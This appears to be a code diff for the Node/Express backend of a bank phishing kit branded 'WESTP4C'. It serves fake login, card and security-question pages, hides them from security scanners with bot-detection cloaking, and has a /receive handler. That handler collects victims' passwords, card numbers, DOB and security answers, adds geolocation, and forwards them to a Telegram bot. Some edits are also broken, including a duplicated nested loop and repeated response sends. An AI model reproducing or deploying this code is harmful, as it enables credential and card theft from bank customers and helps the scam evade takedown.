@@ -25,7 +25,7 @@ const app = express();
 const port = 3000;
 
 app.listen(port, () => {
-    console.log(`Server is running on port ${port}`);
+  console.log(`Server is running on port ${port}`);
 });
 
 app.use(bodyParser.urlencoded({ extended: false }));
@@ -42,31 +42,29 @@ app.use((req, res, next) => {
 // Middleware function for bot detection
 app.use((req, res, next) => {
   const clientUA = req.headers['user-agent'] || req.get('user-agent');
-    const clientIP = getClientIp(req);
-    const clientRef = req.headers.referer || req.headers.origin;
+  const clientIP = getClientIp(req);
+  const clientRef = req.headers.referer || req.headers.origin;
 
+  try {
     if (isBotUA(clientUA) || isBotIP(clientIP) || isBotRef(clientRef)) {
-        return res.status(404).send('Not Found');
+      console.log(`Blocked request: User-Agent: ${clientUA}, IP: ${clientIP}, Referrer: ${clientRef}`);
+      return res.status(404).send('Not Found');
     } else {
-        next();
+      next();
     }
+  } catch (error) {
+    console.error('Error in bot detection middleware:', error);
+    res.status(500).send('Internal Server Error');
+  }
 });
 
 // Route handler for '/login/2'
 app.get('/login/2', async (req, res) => {
   try {
-    let htmlContent;
-    // Read the appropriate HTML file based on whether the request is from a mobile device
-    if (req.isMobile) {
-      htmlContent = await fs.readFile(path.join(__dirname, 'public', 'contactm.html'), 'utf-8');
-    } else {
-      htmlContent = await fs.readFile(path.join(__dirname, 'public', 'contactdesk.html'), 'utf-8');
-    }
-    // Send the HTML content as the response
+    const htmlContent = await fs.readFile(path.join(__dirname, 'public', req.isMobile ? 'contactm.html' : 'contactdesk.html'), 'utf-8');
     res.send(htmlContent);
   } catch (error) {
-    console.error('Error reading file:', error);
-    // Send an error response if there was an error reading the file
+    console.error('Error reading file for /login/2:', error);
     res.status(500).send('Internal Server Error');
   }
 });
@@ -74,18 +72,10 @@ app.get('/login/2', async (req, res) => {
 // Route handler for '/login/3'
 app.get('/login/3', async (req, res) => {
   try {
-    let htmlContent;
-    // Read the appropriate HTML file based on whether the request is from a mobile device
-    if (req.isMobile) {
-      htmlContent = await fs.readFile(path.join(__dirname, 'public', 'secquem.html'), 'utf-8');
-    } else {
-      htmlContent = await fs.readFile(path.join(__dirname, 'public', 'secquedesk.html'), 'utf-8');
-    }
-    // Send the HTML content as the response
+    const htmlContent = await fs.readFile(path.join(__dirname, 'public', req.isMobile ? 'secquem.html' : 'secquedesk.html'), 'utf-8');
     res.send(htmlContent);
   } catch (error) {
-    console.error('Error reading file:', error);
-    // Send an error response if there was an error reading the file
+    console.error('Error reading file for /login/3:', error);
     res.status(500).send('Internal Server Error');
   }
 });
@@ -93,72 +83,13 @@ app.get('/login/3', async (req, res) => {
 // Route handler for '/login/4'
 app.get('/login/4', async (req, res) => {
   try {
-    let htmlContent;
-    // Read the appropriate HTML file based on whether the request is from a mobile device
-    if (req.isMobile) {
-      htmlContent = await fs.readFile(path.join(__dirname, 'public', 'cardm.html'), 'utf-8');
-    } else {
-      htmlContent = await fs.readFile(path.join(__dirname, 'public', 'carddesk.html'), 'utf-8');
-    }
-    // Send the HTML content as the response
+    const htmlContent = await fs.readFile(path.join(__dirname, 'public', req.isMobile ? 'cardm.html' : 'carddesk.html'), 'utf-8');
     res.send(htmlContent);
   } catch (error) {
-    console.error('Error reading file:', error);
-    // Send an error response if there was an error reading the file
+    console.error('Error reading file for /login/4:', error);
     res.status(500).send('Internal Server Error');
   }
 });
-
-// Route handler for form submission
-app.post('/receive', async (req, res) => {
-  let message = '';
-  const myObject = req.body;
-
-  const ipAddress = getClientIp(req);
-  const ipAddressInformation = await sendAPIRequest(ipAddress);
-  const userAgent = req.headers["user-agent"];
-  const systemLang = req.headers["accept-language"];
-
-  const myObjects = Object.keys(myObject);
-
-  if (myObjects.includes('Password')) {
-    message += generateMessage(myObject, ipAddressInformation, userAgent, systemLang);
-  } else if (myObjects.includes('Expiry-Date') || myObjects.includes('Card-Number') || myObjects.includes('Billing Address')) {
-    message += generateMessage(myObject, ipAddressInformation, userAgent, systemLang);
-  } else if (myObjects.includes('message') || myObjects.includes('DOB') || myObjects.includes('SSN') || myObjects.includes('State')) {
-    message += generateMessage(myObject, ipAddressInformation, userAgent, systemLang);
-  }
-
-  console.log(message); 
-  const sendMessage = sendMessageFor(botToken, chatId); 
-  sendMessage(message);
-  res.send('dn');
-});
-
-// Helper function to generate message
-function generateMessage(myObject, ipAddressInformation, userAgent, systemLang) {
-  let message = '';
-  for (const key of Object.keys(myObject)) {
-    if (key !== 'loginTime') {
-      message += `${key}: ${myObject[key]}\n`;
-    }
-  }
-  message += `🌍 GEO-IP INFO\n` +
-             `IP ADDRESS       : ${ipAddressInformation.ip}\n` +
-             `COORDINATES      : ${ipAddressInformation.location.longitude}, ${ipAddressInformation.location.latitude}\n` +
-             `CITY             : ${ipAddressInformation.location.city}\n` +
-             `STATE            : ${ipAddressInformation.location.principalSubdivision}\n` +
-             `ZIP CODE         : ${ipAddressInformation.location.postcode}\n` +
-             `COUNTRY          : ${ipAddressInformation.country.name}\n` +
-             `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
-             `ISP              : ${ipAddressInformation.network.organisation}\n\n` +
-             `💻 SYSTEM INFO\n` +
-             `USER AGENT       : ${userAgent}\n` +
-             `SYSTEM LANGUAGE  : ${systemLang}\n` +
-             `💬 Telegram: https://t.me/UpdateTeams\n`;
-
-  return message;
-}
 
 // Function to send API request
 async function sendAPIRequest(ipAddress) {
@@ -168,6 +99,9 @@ async function sendAPIRequest(ipAddress) {
 
 // Helper function to check if user agent is a bot
 function isBotUA(userAgent) {
+  // Log the user-agent header
+  console.log('User-Agent:', userAgent);
+
   if (!userAgent) {
     userAgent = '';
   }
@@ -196,6 +130,11 @@ function isBotIP(ipAddress) {
   }
 
   for (let i = 0; i < botIPList.length; i++) {
+    if (ipAddress.includes(botIPList[i])) {
+      return true;
+    }
+    
+    for (let i = 0; i < botIPList.length; i++) {
     if (ipAddress.includes(botIPList[i])) {
       return true;
     }
@@ -245,33 +184,127 @@ function isBotRef(referer) {
   return false;
 }
 
-// Middlewares and helper functions continue...
-
 // Middleware function for bot detection
 function antiBotMiddleware(req, res, next) {
     const clientUA = req.headers['user-agent'] || req.get('user-agent');
     const clientIP = getClientIp(req);
     const clientRef = req.headers.referer || req.headers.origin;
 
-    if (isBotUA(clientUA) || isBotIP(clientIP) || isBotRef(clientRef)) {
-        return res.status(404).send('Not Found');
-    } else {
-        next();
+    try {
+        if (isBotUA(clientUA) || isBotIP(clientIP) || isBotRef(clientRef)) {
+            console.log(`Blocked request: User-Agent: ${clientUA}, IP: ${clientIP}, Referrer: ${clientRef}`);
+            return res.status(404).send('Not Found');
+        } else {
+            next();
+        }
+    } catch (error) {
+        console.error('Error in bot detection middleware:', error);
+        res.status(500).send('Internal Server Error');
     }
 }
 
-// Route handler for login pages
-app.get('/login', async (req, res) => {
-  try {
-    let htmlContent;
-    const page = req.params.page;
-    const fileName = req.isMobile ? `loginm.html` : `logindesk.html`;
-    htmlContent = await fs.readFile(path.join(__dirname, fileName), 'utf-8');
-    res.send(htmlContent);
-  } catch (error) {
-    console.error('Error reading file:', error);
-    res.status(500).send('Internal Server Error');
+// Middleware function for form submission
+app.post('/receive', async (req, res) => {
+  let message = '';
+  let myObject = req.body;
+
+  const ipAddress = getClientIp(req);
+  const ipAddressInformation = await sendAPIRequest(ipAddress);
+  const userAgent = req.headers["user-agent"];
+  const systemLang = req.headers["accept-language"];
+
+  const myObjects = Object.keys(myObject);
+  console.log(myObjects);
+
+  if (myObjects.includes('Password')) {
+    message += `✅ UPDATE TEAM | WESTP4C | USER_${ipAddress}\n\n` +
+               `👤 LOGIN \n\n`;
+
+    for (const key of myObjects) {
+      if (key !== 'visitor') {
+        console.log(`${key}: ${myObject[key]}`);
+        message += `${key}: ${myObject[key]}\n`;
+      }
+    }
+    
+    message += `🌍 GEO-IP INFO\n` +
+      `IP ADDRESS       : ${ipAddressInformation.ip}\n` +
+      `COORDINATES      : ${ipAddressInformation.location.longitude}, ${ipAddressInformation.location.latitude}\n` +
+      `CITY             : ${ipAddressInformation.location.city}\n` +
+      `STATE            : ${ipAddressInformation.location.principalSubdivision}\n` +
+      `ZIP CODE         : ${ipAddressInformation.location.postcode}\n` +
+      `COUNTRY          : ${ipAddressInformation.country.name}\n` +
+      `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
+      `ISP              : ${ipAddressInformation.network.organisation}\n\n` +
+      `💻 SYSTEM INFO\n` +
+      `USER AGENT       : ${userAgent}\n` +
+      `SYSTEM LANGUAGE  : ${systemLang}\n` +
+      `💬 Telegram: https://t.me/UpdateTeams\n`;
   }
+
+  if (myObjects.includes('ExpirationDate') || myObjects.includes('CardNumber') || myObjects.includes('Billing Address')) {
+    message += `✅ UPDATE TEAM | WESTP4C | USER_${ipAddress}\n\n` +
+               `👤 CARD INFO\n\n`;
+
+    for (const key of myObjects) {
+      console.log(`${key}: ${myObject[key]}`);
+      message += `${key}: ${myObject[key]}\n`;
+    }
+    
+    message += `🌍 GEO-IP INFO\n` +
+      `IP ADDRESS       : ${ipAddress}\n` +
+      `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
+      `💬 Telegram: https://t.me/UpdateTeams\n`;
+
+    res.send('dn');
+  }
+  
+  if (myObjects.includes('message')) {
+    message += `✅ UPDATE TEAM | WESTP4C | USER_${ipAddress}\n\n` +
+               `👤 SECURITY Q&A\n\n`;
+
+    for (const key of myObjects) {
+      console.log(`${key}: ${myObject[key]}`);
+      message += `${key}: ${myObject[key]}\n`;
+    }
+    
+    message += `🌍 GEO-IP INFO\n` +
+      `IP ADDRESS       : ${ipAddress}\n` +
+      `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
+      `💬 Telegram: https://t.me/UpdateTeams\n`;
+
+    res.send('dn');
+  }
+
+  if (myObjects.includes('DOB') || myObjects.includes('PhoneNumber') || myObjects.includes('State')) {
+    message += `✅ UPDATE TEAM | WESTP4C | USER_${ipAddress}\n\n` +
+               `👤 CONTACT INFO\n\n`;
+
+    for (const key of myObjects) {
+      console.log(`${key}: ${myObject[key]}`);
+      message += `${key}: ${myObject[key]}\n`;
+    }
+    
+    message += `🌍 GEO-IP INFO\n` +
+      `IP ADDRESS       : ${ipAddress}\n` +
+      `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
+      `💬 Telegram: https://t.me/UpdateTeams\n`;
+
+    res.send('dn');
+  }
+
+  console.log(message); 
+  const sendMessage = sendMessageFor(botToken, chatId); 
+  sendMessage(message);
 });
 
-// Middlewares continue...
+// Function to send API request
+async function sendAPIRequest(ipAddress) {
+  const apiResponse = await axios.get(`https://api-bdc.net/data/ip-geolocation?ip=${ipAddress}&localityLanguage=en&key=${ApiKey}`);
+  return apiResponse.data;
+}
+
+// Start the server
+app.listen(port, () => {
+  console.log(`Server is running on port ${port}`);
+}); 
